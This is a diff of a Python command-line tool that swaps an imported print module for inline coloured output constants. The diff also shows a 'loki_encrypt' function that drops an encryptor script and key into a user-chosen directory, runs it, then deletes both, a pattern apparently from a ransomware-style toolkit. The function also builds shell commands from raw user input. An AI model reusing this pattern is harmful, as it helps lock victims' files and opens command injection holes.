@@ -3,7 +3,20 @@ import sys # System stuff.
 import time
 import os # Operating System functions.
 from colorama import Fore # For text colour.
-import prints
+
+# Config (Prints).
+text = (f"{Fore.WHITE}") # Change the colour of text output in the client side 
+dividers = (f"{Fore.LIGHTRED_EX}") # Changes the [], | and : in the client side 
+success = (f"{Fore.WHITE}[{Fore.GREEN}SUCCESS{Fore.WHITE}]") # Success output.
+successfully = (f"{Fore.WHITE}[{Fore.GREEN}SUCCESSFULLY{Fore.WHITE}]") # Successfully output.
+failed = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}FAILED{Fore.WHITE}]") # Failed output.
+prompt = (f"{Fore.WHITE}[{Fore.YELLOW}»{Fore.WHITE}]") # Prompt output.
+notice = (f"{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}]") # Notice output.
+question =  (f"{Fore.WHITE}[{Fore.YELLOW}?{Fore.WHITE}]") # Alert output.
+alert =  (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}!{Fore.WHITE}]") # Alert output.
+exited = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}EXITED{Fore.WHITE}]") # Execited output.
+disconnected = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}DISCONNECTED{Fore.WHITE}]") # Disconnected output.
+command = (f"\n[{Fore.YELLOW}>_{Fore.WHITE}]: ") # Always asks for a command on a new line.
 
 # Pre-run.
 os.system("clear")
@@ -14,8 +27,8 @@ sys.tracebacklimit = 0
 # Program.
 def loki_encrypt():
         try:
-            print(f"\n{prints.question} What directory would you like to encrypt?")
-            dir_encrypt = input(f"{prints.command}")
+            print(f"\n{question} What directory would you like to encrypt?")
+            dir_encrypt = input(f"{command}")
             os.system(f"\ncp ./src/modules/loki_encryptor.py {dir_encrypt}")
             os.system(f"cp ./var/pipes/loki.key {dir_encrypt}")
             os.chdir(f"{dir_encrypt}")
@@ -24,19 +37,19 @@ def loki_encrypt():
             os.system("rm loki_encryptor.py")
             os.system("rm loki.key")
             print(f"\n{Fore.WHITE}-! Files {Fore.RED}encrypted {Fore.WHITE}!-")
-            print(f"\n{prints.exited} {prints.notice} {prints.successfully}\n")
+            print(f"\n{exited} {notice} {successfully}\n")
 
 # Error handling.
         except KeyboardInterrupt:
-            print(f"\n{prints.exited} {prints.notice} {prints.successfully}\n")
-            print(f'{prints.notice} You interrupted the program.\n')
+            print(f"\n{exited} {notice} {successfully}\n")
+            print(f'{notice} You interrupted the program.\n')
             try:
                 sys.exit(0)
             except SystemExit:
                 os._exit(0)
         except ValueError:
-            print(f"\n{prints.exited} {prints.notice} {prints.successfully}")
-            print(f'\n{prints.notice} You entered invalid data into a field.\n')
+            print(f"\n{exited} {notice} {successfully}")
+            print(f'\n{notice} You entered invalid data into a field.\n')
             try:
                 sys.exit(0)
             except SystemExit:
